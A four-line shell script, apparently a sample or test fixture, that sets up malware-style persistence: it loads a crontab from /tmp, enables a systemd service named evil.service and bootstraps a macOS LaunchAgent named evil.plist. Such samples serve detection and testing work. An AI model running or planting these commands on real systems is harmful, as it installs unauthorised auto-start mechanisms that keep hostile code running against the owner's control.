#!/bin/sh
crontab /tmp/persist.tab
systemctl enable evil.service
launchctl bootstrap gui/$UID ~/Library/LaunchAgents/evil.plist
